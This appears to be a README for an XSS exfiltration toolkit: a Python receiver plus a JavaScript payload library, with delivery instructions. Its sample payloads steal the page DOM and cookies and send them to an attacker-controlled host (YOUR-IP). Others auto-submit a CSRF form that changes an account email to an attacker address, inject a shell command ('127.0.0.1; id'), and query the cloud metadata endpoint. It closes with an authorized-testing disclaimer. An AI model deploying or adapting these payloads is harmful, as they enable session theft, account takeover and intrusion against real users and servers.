

# 🕵️ XSS Exfiltration Receiver & Payload Kit ( Beta )

This package provides a complete system for capturing, decoding, and analyzing XSS-exfiltrated data via HTTP requests. 
It includes a threaded Python-based receiver and a stealthy, modular JavaScript payload library designed for DOM inspection, internal API probing, light CSRF, and command injection testing.

---

## 📦 Contents (.. in development ..)

```

xss\_receiver/
├── xssrecv.py         # Python receiver (GET/POST support, decoder)
├── payloads.js        # Modular JS payload library
├── payloads.min.js    # Minified version for stealth deployment
├── payloads.bmk.js    # Bookmarklet version
└── README.md          # This file

````

---

## 🚀 Getting Started

### 1. Run the Receiver

```bash
python3 xssrecv.py --port 8080 --show --json-log --allow-ip 127.0.0.1
````

| Flag         | Description                                           |
| ------------ | ----------------------------------------------------- |
| `--port`     | Port to listen on (default: `80`)                     |
| `--show`     | Print decoded HTML to terminal if present             |
| `--json-log` | Save logs to `decoded_html/log.jsonl`                 |
| `--allow-ip` | Restrict access to IPs (e.g., `--allow-ip 127.0.0.1`) |

---

### 2. Deliver JavaScript Payload

#### Option 1: Inline Injection

Inject this script into a vulnerable page:

```html
<script src="http://YOUR-IP:8080/x.js"></script>
```

#### Option 2: Bookmarklet

Paste the content of `payloads.bmk.js` into a bookmark and click it while visiting the target app.

---

## 💥 Payload Overview

The included `payloads.js` covers multiple testing scenarios:

| Category        | Description                                          |
| --------------- | ---------------------------------------------------- |
| DOM Dump        | Collects and sends the full HTML DOM                 |
| Cookie Theft    | Sends cookies and environment info                   |
| CSRF (GET/POST) | Triggers light GET/POST CSRF to local endpoints      |
| Command Probe   | Sends `id`, `whoami`, or `curl`-style blind requests |
| SSRF            | Hits local/internal metadata endpoints               |
| Probing         | Discovers `/api`, `/admin`, `/config` on same-origin |
| Timing          | Profiles request latency                             |
| Error Beacons   | Captures uncaught JS errors                          |

---

## 🔐 Sample Payloads (Inside `payloads.js`)

```js
// DOM exfiltration
postData(btoa(document.documentElement.outerHTML));

// Cookie + fingerprint
postData(btoa(document.cookie + " | " + navigator.userAgent));

// CSRF auto-form
let f = document.createElement("form");
f.method = "POST";
f.action = ORIGIN + "/account/change-email";
let i = document.createElement("input");
i.name = "email";
i.value = "admin@attacker.test";
f.appendChild(i);
document.body.appendChild(f);
f.submit();

// Command Injection attempt
fetch("/api/system/check", {
  method: "POST",
  body: JSON.stringify({ host: "127.0.0.1; id" }),
  headers: { "Content-Type": "application/json" }
}).then(r => r.text()).then(t => postData(btoa(t)));

// SSRF to cloud metadata
fetch("http://169.254.169.254/latest/meta-data/hostname")
  .then(r => r.text()).then(t => postData(btoa(t)));
```

---

## 🖥️ Hosting Payloads with the Receiver

Your `xssrecv.py` is preconfigured to serve:

* `http://YOUR-IP:8080/x.js` → `payloads.js`
* You can add:

  * `x.min.js` → for stealth minified delivery
  * `x.bmk.js` → for bookmarklet version

---

## 📂 Decoded Output

All captured and decoded data is saved to:

| File/Folder               | Purpose                          |
| ------------------------- | -------------------------------- |
| `decoded_html/`           | Output directory                 |
| `decoded_YYYYMMDDT..html` | Saved decoded HTML content       |
| `raw_YYYYMMDDT..txt`      | Raw query string or POST data    |
| `log.jsonl`               | JSON log of all captured entries |

Each entry includes IP, timestamp, headers, decoded layers, and preview content.

---

## 🔧 Extending

You can easily extend `payloads.js` to:

* Add fingerprinting logic
* Trigger internal SSRF/CSRF/RCE probes
* Enumerate form fields, tokens, iframes, or script execution results
* Chain logic with `setTimeout`, `Promise`, or `MutationObserver`

You can also update `xssrecv.py` to:

* Forward exfiltrated content to webhooks
* Send email/SMS alerts
* Automatically replay stored HTML

---

## 🧪 Testing It Out

1. Start the receiver:

```bash
python3 xssrecv.py --port 8080 --show --json-log
```

2. On another device or browser, simulate the victim:

```html
<script src="http://YOUR-IP:8080/x.js"></script>
```

3. Watch decoded payloads being saved and printed in real time.

---

## ⚠️ Legal Disclaimer

This tool is for **authorized security testing and educational use only**. 
Do not use against systems without **explicit written permission**. Always follow your organization's rules of engagement and testing scope.

---

## 🛠 TODO / Ideas

* [ ] Add TLS/HTTPS support
* [ ] Webhook alert forwarding (Slack/Discord)
* [ ] DOM replay viewer UI
* [ ] Auto-generate signed payloads
* [ ] Dockerfile + Makefile for deployment

---

## 🧠 Credits

Built by operators for operators. Use responsibly.

```
\

